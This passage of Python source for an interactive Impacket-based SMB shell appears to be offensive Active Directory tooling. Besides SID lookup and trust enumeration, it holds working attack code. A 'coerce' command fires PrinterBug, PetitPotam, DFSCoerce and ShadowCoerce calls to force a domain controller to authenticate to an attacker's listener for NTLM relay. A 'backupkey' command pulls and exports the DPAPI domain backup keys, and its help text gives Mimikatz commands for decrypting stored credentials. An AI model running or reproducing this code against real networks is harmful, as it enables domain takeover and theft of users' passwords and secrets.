            if lock_info:
                print("\nAccount Lockout Policy:")
                thresh = self._to_int(lock_info['LockoutThreshold'])
                print("  Lockout Threshold:             %s" % ("%d invalid attempts" % thresh if thresh > 0 else "0 (No Lockout)"))
                print("  Lockout Duration:              %s" % self._format_time_interval(lock_info['LockoutDuration']))
                print("  Lockout Observation Window:    %s" % self._format_time_interval(lock_info['LockoutObservationWindow']))

            if gen_info:
                print("\nDomain Statistics:")
                print("  User Accounts:                 %d" % self._to_int(gen_info['UserCount']))
                print("  Group Accounts:                %d" % self._to_int(gen_info['GroupCount']))
                print("  Alias Accounts:                %d" % self._to_int(gen_info['AliasCount']))

            print("=" * 65 + "\n")

        except Exception as e:
            print("[-] Error querying password policy: %s" % str(e))
        finally:
            if domainHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, domainHandle)
                except Exception:
                    pass
            if serverHandle is not None and dce is not None:
                try:
                    samr.hSamrCloseHandle(dce, serverHandle)
                except Exception:
                    pass
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

    do_get_domain_pw_policy = do_enum_pwpolicy

    def do_lookup_sids(self, line):
        """lookup_sids <sids|rids|range> - Resolves SIDs, RIDs, or RID ranges to account names via LSARPC"""
        if self.smb is None:
            print("[-] No active SMB connection")
            return

        parts = shlex.split(line) if line else []
        if not parts:
            print("Usage: lookup_sids <sids|rids|range (e.g. 500-550)>")
            return

        dce = None
        policyHandle = None

        try:
            rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\lsarpc', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(lsat.MSRPC_UUID_LSAT)

            resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
            policyHandle = resp['PolicyHandle']

            domainSid = None
            try:
                resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle, lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
                sidObj = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid']
                if sidObj != NULL:
                    domainSid = sidObj.formatCanonical()
            except Exception:
                pass

            if not domainSid:
                try:
                    resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle, lsad.POLICY_INFORMATION_CLASS.PolicyPrimaryDomainInformation)
                    sidObj = resp['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid']
                    if sidObj != NULL:
                        domainSid = sidObj.formatCanonical()
                except Exception:
                    pass

            sids = []
            for p in parts:
                if '-' in p and p.count('-') == 1 and p.replace('-', '').isdigit():
                    start_str, end_str = p.split('-')
                    start, end = int(start_str), int(end_str)
                    if not domainSid:
                        print("[-] Could not retrieve domain SID for RID range %s" % p)
                        continue
                    for rid in range(start, end + 1):
                        sids.append("%s-%d" % (domainSid, rid))
                elif p.isdigit():
                    if not domainSid:
                        print("[-] Could not retrieve domain SID for RID %s" % p)
                        continue
                    sids.append("%s-%d" % (domainSid, int(p)))
                elif p.upper().startswith("S-"):
                    sids.append(p)
                else:
                    print("[-] Unrecognized SID/RID token: %s" % p)

            if not sids:
                print("[-] No valid SIDs to resolve")
                return

            print("[*] Resolving %d SID(s)..." % len(sids))
            print("\n%-40s  %-15s  %s" % ("SID", "Type", "Account"))
            print("-" * 75)

            CHUNK_SIZE = 100
            for i in range(0, len(sids), CHUNK_SIZE):
                chunk = sids[i:i + CHUNK_SIZE]
                resp = None
                try:
                    resp = lsat.hLsarLookupSids(dce, policyHandle, chunk, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
                except DCERPCException as e:
                    if str(e).find('STATUS_NONE_MAPPED') >= 0:
                        continue
                    elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                        resp = e.get_packet()
                    else:
                        raise

                if resp:
                    domains = resp['ReferencedDomains']['Domains']
                    names = resp['TranslatedNames']['Names']
                    for idx, item in enumerate(names):
                        sid_str = chunk[idx]
                        use_val = item['Use']
                        try:
                            use_name = lsat.SID_NAME_USE.enumItems(use_val).name
                        except Exception:
                            use_name = "Unknown"
                        if use_val != lsat.SID_NAME_USE.SidTypeUnknown:
                            domain_name = domains[item['DomainIndex']]['Name']
                            account_name = item['Name']
                            print("%-40s  %-15s  %s\\%s" % (sid_str, use_name, domain_name, account_name))

            print("-" * 75 + "\n")

        except Exception as e:
            print("[-] Error resolving SIDs: %s" % str(e))
        finally:
            if policyHandle is not None and dce is not None:
                try:
                    lsad.hLsarClose(dce, policyHandle)
                except Exception:
                    pass
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

    def do_lookup_names(self, line):
        """lookup_names <name1> [name2 ...] - Resolves account and group names to SIDs via LSARPC"""
        if self.smb is None:
            print("[-] No active SMB connection")
            return

        parts = shlex.split(line) if line else []
        if not parts:
            print("Usage: lookup_names <name1> [name2 ...]")
            return

        dce = None
        policyHandle = None

        try:
            rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\lsarpc', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(lsat.MSRPC_UUID_LSAT)

            resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
            policyHandle = resp['PolicyHandle']

            resp = None
            try:
                resp = lsat.hLsarLookupNames(dce, policyHandle, parts, lookupLevel=1)
            except DCERPCException as e:
                if str(e).find('STATUS_NONE_MAPPED') >= 0:
                    print("[-] None of the specified names could be mapped")
                    return
                elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
                    resp = e.get_packet()
                else:
                    raise

            if resp:
                domains = resp['ReferencedDomains']['Domains']
                translated = resp['TranslatedSids']['Sids']
                print("\n%-25s  %-15s  %-20s  %s" % ("Name", "Type", "Domain", "SID"))
                print("-" * 80)
                for idx, item in enumerate(translated):
                    name = parts[idx]
                    use_val = item['Use']
                    try:
                        use_name = lsat.SID_NAME_USE.enumItems(use_val).name
                    except Exception:
                        use_name = "Unknown"
                    if use_val != lsat.SID_NAME_USE.SidTypeUnknown:
                        d_idx = item['DomainIndex']
                        rel_id = self._to_int(item['RelativeId'])
                        if d_idx >= 0 and d_idx < len(domains):
                            domain_info = domains[d_idx]
                            domain_name = domain_info['Name']
                            domain_sid = domain_info['Sid'].formatCanonical()
                            full_sid = "%s-%d" % (domain_sid, rel_id)
                            print("%-25s  %-15s  %-20s  %s" % (name, use_name, domain_name, full_sid))
                        else:
                            print("%-25s  %-15s  %-20s  RID: %d" % (name, use_name, "", rel_id))
                    else:
                        print("%-25s  Unmapped" % name)
                print("-" * 80 + "\n")

        except Exception as e:
            print("[-] Error resolving names: %s" % str(e))
        finally:
            if policyHandle is not None and dce is not None:
                try:
                    lsad.hLsarClose(dce, policyHandle)
                except Exception:
                    pass
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

    def do_enum_trusts(self, line):
        """enum_trusts - Enumerates domain and forest trusts via Netlogon (DsrEnumerateDomainTrusts) or LSA"""
        if self.smb is None:
            print("[-] No active SMB connection")
            return

        trusts_found = False
        dce = None

        # Primary attempt: Netlogon (DsrEnumerateDomainTrusts)
        try:
            rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\netlogon', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(nrpc.MSRPC_UUID_NRPC)

            req = nrpc.DsrEnumerateDomainTrusts()
            req['ServerName'] = NULL
            req['Flags'] = 0x3F  # All trust types (in-forest, outbound, inbound, primary, native)
            resp = dce.request(req)

            domains = resp['Domains']['Domains']
            print("\n" + "=" * 70)
            print("Domain Trusts via Netlogon (DsrEnumerateDomainTrusts)")
            print("=" * 70)

            for d in domains:
                netbios = self._clean_str(d['NetbiosDomainName'])
                dns = self._clean_str(d['DnsDomainName'])
                flags = self._to_int(d['Flags'])
                trust_type_val = self._to_int(d['TrustType'])
                attrs = self._to_int(d['TrustAttributes'])
                sid = d['DomainSid'].formatCanonical() if d['DomainSid'] != NULL else ''

                if (flags & 0x0022) == 0x0022:
                    direction = "Bidirectional (Inbound/Outbound)"
                elif flags & 0x0002:
                    direction = "Outbound (Target trusts this domain)"
                elif flags & 0x0020:
                    direction = "Inbound (This domain trusts target)"
                elif flags & 0x0008:
                    direction = "Primary (Local Domain)"
                else:
                    direction = "Internal / Unknown"

                trust_types = {1: "Downlevel (Windows NT)", 2: "Uplevel (Active Directory)", 3: "MIT Kerberos Realm", 4: "DCE"}
                t_type_str = trust_types.get(trust_type_val, "Unknown (%d)" % trust_type_val)

                attr_list = []
                if attrs & 0x0001:
                    attr_list.append("NON_TRANSITIVE")
                if attrs & 0x0002:
                    attr_list.append("UPLEVEL_ONLY")
                if attrs & 0x0004:
                    attr_list.append("FILTER_SIDS (Quarantined)")
                if attrs & 0x0008:
                    attr_list.append("FOREST_TRANSITIVE")
                if attrs & 0x0010:
                    attr_list.append("CROSS_ORGANIZATION")
                if attrs & 0x0020:
                    attr_list.append("WITHIN_FOREST")
                if attrs & 0x0040:
                    attr_list.append("TREAT_AS_EXTERNAL")
                if attrs & 0x0080:
                    attr_list.append("USES_RC4")

                flag_list = []
                if flags & 0x0001:
                    flag_list.append("IN_FOREST")
                if flags & 0x0004:
                    flag_list.append("TREE_ROOT")
                if flags & 0x0008:
                    flag_list.append("PRIMARY")
                if flags & 0x0010:
                    flag_list.append("NATIVE_MODE")

                print("  NetBIOS Domain:     %s" % netbios)
                print("  DNS Domain:         %s" % dns)
                if sid:
                    print("  Domain SID:         %s" % sid)
                print("  Trust Direction:    %s" % direction)
                print("  Trust Type:         %s" % t_type_str)
                print("  Trust Attributes:   %s" % (", ".join(attr_list) if attr_list else "None"))
                print("  Trust Flags:        %s" % (", ".join(flag_list) if flag_list else "None"))
                print("-" * 70)

            trusts_found = True
            print("[+] Total trusts found: %d\n" % len(domains))
        except Exception as e:
            print("[*] Netlogon query not available (%s), falling back to LSA..." % str(e))
        finally:
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass
            dce = None

        if not trusts_found:
            policyHandle = None
            try:
                rpctransport = transport.SMBTransport(self.smb.getRemoteHost(), filename=r'\lsarpc', smb_connection=self.smb)
                dce = rpctransport.get_dce_rpc()
                dce.connect()
                dce.bind(lsad.MSRPC_UUID_LSAD)

                resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_VIEW_LOCAL_INFORMATION)
                policyHandle = resp['PolicyHandle']

                enumerationContext = 0
                status = STATUS_MORE_ENTRIES
                lsa_trusts = []

                while status == STATUS_MORE_ENTRIES:
                    try:
                        resp = lsad.hLsarEnumerateTrustedDomainsEx(dce, policyHandle, enumerationContext=enumerationContext)
                    except DCERPCException as e:
                        if str(e).find('STATUS_MORE_ENTRIES') < 0:
                            raise
                        resp = e.get_packet()

                    buffer = resp['EnumerationBuffer']['Buffer']
                    for t in buffer:
                        lsa_trusts.append(t)

                    enumerationContext = resp['EnumerationContext']
                    status = resp['ErrorCode']

                print("\n" + "=" * 70)
                print("Domain Trusts via LSA (hLsarEnumerateTrustedDomainsEx)")
                print("=" * 70)

                for t in lsa_trusts:
                    name = self._clean_str(t['Name'])
                    flat = self._clean_str(t['FlatName'])
                    sid = t['Sid'].formatCanonical() if t['Sid'] != NULL else ''
                    dir_val = self._to_int(t['TrustDirection'])
                    dirs = {1: "Inbound", 2: "Outbound", 3: "Bidirectional"}
                    dir_str = dirs.get(dir_val, "Unknown (%d)" % dir_val)

                    print("  Domain Name:        %s" % name)
                    print("  Flat (NetBIOS):     %s" % flat)
                    if sid:
                        print("  Domain SID:         %s" % sid)
                    print("  Trust Direction:    %s" % dir_str)
                    print("  Trust Type:         %d" % self._to_int(t['TrustType']))
                    print("  Trust Attributes:   0x%08x" % self._to_int(t['TrustAttributes']))
                    print("-" * 70)

                print("[+] Total trusts found: %d\n" % len(lsa_trusts))

            except Exception as e:
                print("[-] Error enumerating trusts via LSA: %s" % str(e))
            finally:
                if policyHandle is not None and dce is not None:
                    try:
                        lsad.hLsarClose(dce, policyHandle)
                    except Exception:
                        pass
                if dce is not None:
                    try:
                        dce.disconnect()
                    except Exception:
                        pass

    @staticmethod
    def _format_efs_path(listener):
        if listener.startswith('\\\\') or listener.startswith('//'):
            path = listener
        elif '@' in listener:
            if '/' in listener or '\\' in listener:
                path = '\\\\%s' % listener.lstrip('\\/')
            else:
                path = '\\\\%s/test/Settings.ini' % listener
        else:
            if '/' in listener or '\\' in listener:
                path = '\\\\%s' % listener.lstrip('\\/')
            else:
                path = '\\\\%s\\test\\Settings.ini' % listener
        if not path.endswith('\x00'):
            path += '\x00'
        return path

    @staticmethod
    def _call_efs_open_raw(dce, listener):
        req = EfsRpcOpenFileRaw()
        req['FileName'] = MiniImpacketShell._format_efs_path(listener)
        req['Flags'] = 0
        return dce.request(req)

    @staticmethod
    def _call_efs_encrypt(dce, listener):
        req = EfsRpcEncryptFileSrv()
        req['FileName'] = MiniImpacketShell._format_efs_path(listener)
        return dce.request(req)

    @staticmethod
    def _call_efs_decrypt(dce, listener):
        req = EfsRpcDecryptFileSrv()
        req['FileName'] = MiniImpacketShell._format_efs_path(listener)
        req['OpenFlag'] = 0
        return dce.request(req)

    @staticmethod
    def _call_efs_query_users(dce, listener):
        req = EfsRpcQueryUsersOnFile()
        req['FileName'] = MiniImpacketShell._format_efs_path(listener)
        return dce.request(req)

    @staticmethod
    def _call_dfs_remove_std_root(dce, listener):
        req = NetrDfsRemoveStdRoot()
        req['ServerName'] = '%s\x00' % listener
        req['RootShare'] = 'test\x00'
        req['ApiFlags'] = 0
        return dce.request(req)

    @staticmethod
    def _call_dfs_add_std_root(dce, listener):
        req = NetrDfsAddStdRoot()
        req['ServerName'] = '%s\x00' % listener
        req['RootShare'] = 'test\x00'
        req['Comment'] = 'test\x00'
        req['ApiFlags'] = 0
        return dce.request(req)

    def _coerce_printerbug(self, listener):
        target = self.smb.getRemoteHost()
        print("[*] [PrinterBug] Connecting to \\pipe\\spoolss on %s..." % target)
        dce = None
        handle = None
        try:
            rpctransport = transport.SMBTransport(target, filename=r'\spoolss', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)
        except Exception as e:
            print("[-] [PrinterBug] Failed to bind to \\pipe\\spoolss: %s" % e)
            return False

        try:
            print("[*] [PrinterBug] Opening printer handle for \\\\%s..." % target)
            resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % target)
            handle = resp['pHandle']
        except Exception as e:
            print("[-] [PrinterBug] hRpcOpenPrinter failed: %s" % e)
            try:
                dce.disconnect()
            except Exception:
                pass
            return False

        try:
            print("[*] [PrinterBug] Triggering RpcRemoteFindFirstPrinterChangeNotificationEx to \\\\%s..." % listener)
            if '@' in listener and not ('/' in listener or '\\' in listener):
                capture_target = '%s/pipe' % listener
            else:
                capture_target = listener
            rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
                dce,
                handle,
                rprn.PRINTER_CHANGE_ADD_JOB,
                pszLocalMachine='\\\\%s\x00' % capture_target
            )
            print("[+] [PrinterBug] SUCCESS: Coercion call completed without exception! Target authenticating to \\\\%s." % listener)
            return True
        except Exception as e:
            err = str(e)
            if any(k in err.lower() for k in ['rpc_s_server_unavailable', '0x000006ba', '0x6ba', 'rpc_s_access_denied']):
                print("[+] [PrinterBug] SUCCESS: Coercion triggered! Target attempted authentication to \\\\%s (%s)." % (listener, err.strip()))
                return True
            else:
                print("[-] [PrinterBug] RpcRemoteFindFirstPrinterChangeNotificationEx returned: %s" % err.strip())
                return False
        finally:
            if handle is not None and dce is not None:
                try:
                    rprn.hRpcClosePrinter(dce, handle)
                except Exception:
                    pass
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

    def _coerce_petitpotam(self, listener):
        target = self.smb.getRemoteHost()
        pipes = [
            (r'\efsrpc', uuidtup_to_bin(('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0'))),
            (r'\lsarpc', uuidtup_to_bin(('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0'))),
            (r'\samr', uuidtup_to_bin(('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0'))),
            (r'\lsass', uuidtup_to_bin(('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0'))),
            (r'\netlogon', uuidtup_to_bin(('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0'))),
        ]

        methods = [
            ('EfsRpcOpenFileRaw', self._call_efs_open_raw),
            ('EfsRpcEncryptFileSrv', self._call_efs_encrypt),
            ('EfsRpcDecryptFileSrv', self._call_efs_decrypt),
            ('EfsRpcQueryUsersOnFile', self._call_efs_query_users),
        ]

        for pipe_name, uuid_val in pipes:
            print("[*] [PetitPotam] Trying pipe %s on %s..." % (pipe_name, target))
            dce = None
            try:
                rpctransport = transport.SMBTransport(target, filename=pipe_name, smb_connection=self.smb)
                dce = rpctransport.get_dce_rpc()
                dce.connect()
                dce.bind(uuid_val)
            except Exception as e:
                print("[-] [PetitPotam] Could not bind to %s: %s" % (pipe_name, e))
                continue

            success = False
            for method_name, method_func in methods:
                print("[*] [PetitPotam] Invoking %s on %s..." % (method_name, pipe_name))
                try:
                    resp = method_func(dce, listener)
                    error_code = 0
                    if resp and 'ErrorCode' in resp:
                        error_code = resp['ErrorCode']
                    if error_code in (0, 53, 0x35):
                        err_name = "ERROR_BAD_NETPATH" if error_code in (53, 0x35) else "SUCCESS"
                        print("[+] [PetitPotam] SUCCESS: Coercion triggered via %s on %s! Target attempted authentication to \\\\%s (%s)." % (method_name, pipe_name, listener, err_name))
                        success = True
                        break
                    elif error_code == 5:
                        print("[-] [PetitPotam] %s returned: Access Denied (target may be patched with CVE-2021-36942)" % method_name)
                    else:
                        print("[-] [PetitPotam] %s returned: ErrorCode 0x%x" % (method_name, error_code))
                except Exception as e:
                    err = str(e)
                    if any(k in err.lower() for k in ['error_bad_netpath', 'rpc_s_invalid_net_addr', '0x35', '0x00000035', 'status_bad_network_path', 'status_object_path_not_found', 'bad_netpath']):
                        print("[+] [PetitPotam] SUCCESS: Coercion triggered via %s on %s! Target attempted authentication to \\\\%s (%s)." % (method_name, pipe_name, listener, err.strip()))
                        success = True
                        break
                    else:
                        print("[-] [PetitPotam] %s returned: %s" % (method_name, err.strip()))

            try:
                dce.disconnect()
            except Exception:
                pass

            if success:
                return True

        return False

    def _coerce_dfscoerce(self, listener):
        target = self.smb.getRemoteHost()
        print("[*] [DFSCoerce] Connecting to \\pipe\\netdfs on %s..." % target)
        dce = None
        try:
            rpctransport = transport.SMBTransport(target, filename=r'\netdfs', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(uuidtup_to_bin(('4fc742e0-4a10-11cf-8273-00aa004ae673', '3.0')))
        except Exception as e:
            print("[-] [DFSCoerce] Failed to bind to \\pipe\\netdfs: %s" % e)
            return False

        methods = [
            ('NetrDfsRemoveStdRoot', self._call_dfs_remove_std_root),
            ('NetrDfsAddStdRoot', self._call_dfs_add_std_root),
        ]

        success = False
        try:
            for method_name, method_func in methods:
                print("[*] [DFSCoerce] Invoking %s..." % method_name)
                try:
                    resp = method_func(dce, listener)
                    error_code = 0
                    if resp and 'ErrorCode' in resp:
                        error_code = resp['ErrorCode']
                    if error_code in (0, 53, 0x35):
                        err_name = "ERROR_BAD_NETPATH" if error_code in (53, 0x35) else "SUCCESS"
                        print("[+] [DFSCoerce] SUCCESS: Coercion triggered via %s! Target attempted authentication to \\\\%s (%s)." % (method_name, listener, err_name))
                        success = True
                        break
                    elif error_code == 5:
                        print("[-] [DFSCoerce] %s returned: Access Denied (code: 0x5)" % method_name)
                    else:
                        print("[-] [DFSCoerce] %s returned: ErrorCode 0x%x" % (method_name, error_code))
                except Exception as e:
                    err = str(e)
                    if any(k in err.lower() for k in ['error_bad_netpath', 'werr_bad_netpath', 'rpc_s_invalid_net_addr', '0x35', '0x00000035', 'status_bad_network_path', 'status_object_path_not_found', 'bad_netpath']):
                        print("[+] [DFSCoerce] SUCCESS: Coercion triggered via %s! Target attempted authentication to \\\\%s (%s)." % (method_name, listener, err.strip()))
                        success = True
                        break
                    else:
                        print("[-] [DFSCoerce] %s returned: %s" % (method_name, err.strip()))
        finally:
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

        return success

    def _coerce_shadowcoerce(self, listener):
        target = self.smb.getRemoteHost()
        print("[*] [ShadowCoerce] Connecting to \\pipe\\Fssagentrpc on %s..." % target)
        dce = None
        try:
            rpctransport = transport.SMBTransport(target, filename=r'\Fssagentrpc', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(uuidtup_to_bin(('a8e0653c-2744-4389-a61d-7373df8b2292', '3.0')))
        except Exception as e:
            print("[-] [ShadowCoerce] Failed to bind to \\pipe\\Fssagentrpc: %s" % e)
            return False

        try:
            print("[*] [ShadowCoerce] Invoking IsPathSupported...")
            req = IsPathSupported()
            req['ShareName'] = '%s\x00' % listener
            resp = dce.request(req)
            error_code = 0
            if resp and 'ErrorCode' in resp:
                error_code = resp['ErrorCode']
            if error_code in (0, 53, 0x35):
                print("[+] [ShadowCoerce] SUCCESS: IsPathSupported executed! Target authenticating to \\\\%s." % listener)
                return True
            else:
                print("[-] [ShadowCoerce] IsPathSupported returned code: 0x%x" % error_code)
                return False
        except Exception as e:
            err = str(e)
            if any(k in err.lower() for k in ['error_bad_netpath', 'rpc_s_access_denied', '0x35', '0x00000035', 'bad_netpath']):
                print("[+] [ShadowCoerce] SUCCESS: Coercion triggered via IsPathSupported! Target attempted authentication to \\\\%s (%s)." % (listener, err.strip()))
                return True
            else:
                print("[-] [ShadowCoerce] IsPathSupported returned: %s" % err.strip())
                return False
        finally:
            if dce is not None:
                try:
                    dce.disconnect()
                except Exception:
                    pass

    def do_coerce(self, line):
        """coerce <listener_ip> [method] [-a/--all]
Triggers authentication coercion from the target machine account (e.g. DC$) back to your listener IP/hostname.
Methods:
  all         - Tries spoolss (PrinterBug), efsrpc (PetitPotam), netdfs (DFSCoerce), and Fssagentrpc (ShadowCoerce) [default]
  spoolss     - PrinterBug (MS-RPRN) via \\pipe\\spoolss (unpatched, authenticated)
  efsrpc      - PetitPotam (MS-EFSR) via \\pipe\\efsrpc / \\pipe\\lsarpc
  netdfs      - DFSCoerce (MS-DFSNM) via \\pipe\\netdfs
  fsrvp       - ShadowCoerce (MS-FSRVP) via \\pipe\\Fssagentrpc
Flags:
  -a, --all   - Continue trying remaining methods even if one succeeds
"""
        if self.smb is None or self.loggedIn is False:
            print("[-] No active SMB connection or not logged in")
            return

        parts = shlex.split(line) if line else []
        if not parts:
            print("Usage: coerce <listener_ip_or_host> [method] [-a/--all]")
            print("Methods: spoolss, efsrpc, netdfs, fsrvp, all (default)")
            return

        try_all_methods = False
        clean_parts = []
        for p in parts:
            if p in ('-a', '--all', '-f', '--force'):
                try_all_methods = True
            else:
                clean_parts.append(p)

        if not clean_parts:
            print("[-] Listener IP/hostname is required")
            return

        listener = clean_parts[0].strip().lstrip('\\/').rstrip('\\/')
        method = "all"
        if len(clean_parts) > 1:
            method = clean_parts[1].lower()

        print("=" * 60)
        print("[*] Target host: %s" % self.smb.getRemoteHost())
        print("[*] Listener:    %s" % listener)
        print("[*] Method:      %s" % method)
        print("=" * 60)

        results = {}
        if method in ('spoolss', 'printerbug', 'rprn'):
            results['spoolss'] = self._coerce_printerbug(listener)
        elif method in ('efsrpc', 'petitpotam', 'efs'):
            results['efsrpc'] = self._coerce_petitpotam(listener)
        elif method in ('netdfs', 'dfscoerce', 'dfs'):
            results['netdfs'] = self._coerce_dfscoerce(listener)
        elif method in ('fsrvp', 'shadowcoerce'):
            results['fsrvp'] = self._coerce_shadowcoerce(listener)
        elif method == 'all':
            results['spoolss'] = self._coerce_printerbug(listener)
            if not results['spoolss'] or try_all_methods:
                results['efsrpc'] = self._coerce_petitpotam(listener)
            if (not results.get('efsrpc') and not results.get('spoolss')) or try_all_methods:
                results['netdfs'] = self._coerce_dfscoerce(listener)
            if (not any(results.values())) or try_all_methods:
                results['fsrvp'] = self._coerce_shadowcoerce(listener)
        else:
            print("[-] Unknown coercion method: %s" % method)
            print("    Valid methods: spoolss, efsrpc, netdfs, fsrvp, all")
            return

        print("-" * 60)
        successful = [m for m, res in results.items() if res]
        if successful:
            print("[+] Coercion succeeded via: %s" % ", ".join(successful))
            print("[+] Check your listener (e.g. ntlmrelayx, Responder) for incoming authentication!")
        else:
            print("[-] All attempted coercion methods failed. The target may have services disabled or fully patched.")
        print("-" * 60)

    def help_backupkey(self):
        print("""
Usage: backupkey [-export [dir]] [-o [dir]]

Extracts DPAPI Domain Backup Keys (both Preferred and Legacy keys) from the target Domain Controller.
Operates directly over the existing authenticated SMB session via \\pipe\\lsarpc (LSA Secrets)
using the active SMB session key to decrypt the secret data.

Options:
  -export [dir], -o [dir]  Export the extracted private key (.pvk), certificate (.der),
                           and legacy key (.key) files to the specified directory (defaults to current dir).

Use Cases:
  - Decrypt DPAPI master keys, scheduled task passwords, Chrome/Edge credentials, and Windows Vault secrets offline.
  - Generate Mimikatz commands:
      dpapi::cache /pvk:G$BCKUPKEY_<guid>.pvk
      dpapi::masterkey /in:"%APPDATA%\\Microsoft\\Protect\\<SID>\\<guid>" /pvk:G$BCKUPKEY_<guid>.pvk
""")

    def complete_backupkey(self, text, line, begidx, endidx):
        options = ['-export', '-o', '--help']
        return [o for o in options if o.startswith(text)]

    def do_backupkey(self, line):
        """backupkey [-export [dir]]
Extracts DPAPI Domain Backup Keys from the target Domain Controller via \\pipe\\lsarpc.
Decrypts G$BCKUPKEY_PREFERRED and G$BCKUPKEY_P using the active SMB session key.
Optionally exports .pvk, .der, and .key files for offline DPAPI decryption in Mimikatz or Impacket."""
        if self.smb is None or self.loggedIn is False:
            print("[-] No active SMB connection or not logged in")
            return

        parts = shlex.split(line) if line else []
        export = False
        export_dir = '.'

        i = 0
        while i < len(parts):
            p = parts[i]
            if p in ('-export', '--export', '-o', '--output'):
                export = True
                if i + 1 < len(parts) and not parts[i + 1].startswith('-'):
                    export_dir = parts[i + 1]
                    i += 1
            elif p in ('-h', '--help'):
                self.help_backupkey()
                return
            i += 1

        if export:
            try:
                os.makedirs(export_dir, exist_ok=True)
            except Exception as e:
                print("[-] Failed to create output directory '%s': %s" % (export_dir, e))
                return

        target = self.smb.getRemoteHost()
        print("=" * 60)
        print("[*] DPAPI Domain Backup Key Extraction")
        print("[*] Target DC: %s" % target)
        if export:
            print("[*] Export Directory: %s" % os.path.abspath(export_dir))
        print("=" * 60)

        dce = None
        keys_extracted = 0
        try:
            print("[*] Connecting to \\pipe\\lsarpc on %s..." % target)
            rpctransport = transport.SMBTransport(target, filename=r'\lsarpc', smb_connection=self.smb)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(lsad.MSRPC_UUID_LSAD)

            print("[*] Opening LSA Policy (POLICY_GET_PRIVATE_INFORMATION)...")
            policy_resp = lsad.hLsarOpenPolicy2(dce, lsad.POLICY_GET_PRIVATE_INFORMATION)
            policy_handle = policy_resp['PolicyHandle']

            session_key = self.smb.getSessionKey()
            if not session_key:
                print("[-] Unable to retrieve SMB session key from connection")
                return

            for keyname in ("G$BCKUPKEY_PREFERRED", "G$BCKUPKEY_P"):
                print("[*] Querying LSA secret '%s'..." % keyname)
                try:
                    enc_guid = lsad.hLsarRetrievePrivateData(dce, policy_handle, keyname)
                    buffer = crypto.decryptSecret(session_key, enc_guid)
                    guid = bin_to_string(buffer)
                except Exception as e:
                    print("[-] Failed to retrieve '%s': %s" % (keyname, e))
                    continue

                secret_name = "G$BCKUPKEY_{}".format(guid)
                print("[+] Found %s -> %s" % (keyname, secret_name))
                try:
                    enc_secret = lsad.hLsarRetrievePrivateData(dce, policy_handle, secret_name)
                    secret = crypto.decryptSecret(session_key, enc_secret)
                except Exception as e:
                    print("[-] Failed to retrieve '%s': %s" % (secret_name, e))
                    continue

                if len(secret) < 4:
                    print("[-] Secret '%s' data too short (%d bytes)" % (secret_name, len(secret)))
                    continue

                keyVersion = struct.unpack('<L', secret[:4])[0]
                if keyVersion == 1:
                    # Legacy key
                    backup_key = P_BACKUP_KEY(secret)
                    backupkey = backup_key['Data']
                    keys_extracted += 1
                    print("-" * 60)
                    print("[+] Legacy Domain Backup Key (v1):")
                    print("    Name:           %s" % secret_name)
                    print("    GUID:           %s" % guid)
                    print("    Version:        %d" % keyVersion)
                    print("    Key Length:     %d bytes" % len(backupkey))
                    print("    Key (Hex):      0x%s" % hexlify(backupkey).decode('latin-1'))
                    if export:
                        out_path = os.path.join(export_dir, "%s.key" % secret_name)
                        try:
                            with open(out_path, 'wb') as f:
                                f.write(backupkey)
                            print("[+] Exported legacy key to: %s" % out_path)
                        except Exception as e_write:
                            print("[-] Error writing %s: %s" % (out_path, e_write))

                elif keyVersion == 2:
                    # Preferred key
                    backup_key = PREFERRED_BACKUP_KEY(secret)
                    pvk = backup_key['Data'][:backup_key['KeyLength']]
                    cert = backup_key['Data'][backup_key['KeyLength']:backup_key['KeyLength'] + backup_key['CertificateLength']]

                    # Build PVK header
                    header = PVK_FILE_HDR()
                    header['dwMagic'] = 0xb0b5f11e
                    header['dwVersion'] = 0
                    header['dwKeySpec'] = 1
                    header['dwEncryptType'] = 0
                    header['cbEncryptData'] = 0
                    header['cbPvk'] = backup_key['KeyLength']
                    backupkey_pvk = header.getData() + pvk

                    keys_extracted += 1
                    print("-" * 60)
                    print("[+] Preferred Domain Backup Key (v2):")
                    print("    Name:           %s" % secret_name)
                    print("    GUID:           %s" % guid)
                    print("    Version:        %d" % keyVersion)
